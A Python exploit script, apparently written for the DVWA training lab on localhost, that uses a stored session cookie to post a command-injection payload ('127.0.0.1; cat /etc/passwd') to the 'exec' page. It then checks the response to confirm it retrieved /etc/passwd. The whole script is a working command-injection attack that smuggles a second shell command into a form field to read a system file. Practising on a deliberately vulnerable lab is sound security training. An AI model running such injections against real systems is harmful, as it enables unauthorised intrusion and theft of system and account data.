
import requests

# Use the session from previous login
s = requests.Session()
s.cookies.update({'PHPSESSID': '9f8c8our5hpn5aqrjdbg4k9er5', 'security': 'low'})

# DVWA Command Injection vulnerability
# Security level is 'low', so minimal filtering
# Inject command to read /etc/passwd

url = "http://localhost:28080/vulnerabilities/exec/"

# Test with simple command injection - append ; cat /etc/passwd
data = {
    "ip": "127.0.0.1; cat /etc/passwd",
    "Submit": "Submit"
}

r = s.post(url, data=data)

if r.status_code == 200:
    print("[+] Command Injection successful!")
    print("\n[*] Response (first 1000 chars):")
    print(r.text[:1000])
    
    # Check if we got /etc/passwd content
    if "root:" in r.text:
        print("\n[+] SUCCESS: Retrieved /etc/passwd!")
        # Extract the relevant part
        import re
        match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if match:
            print("\n[*] Command output:")
            print(match.group(1))
    else:
        print("\n[-] /etc/passwd not found in response")
else:
    print(f"[-] Request failed with status {r.status_code}")

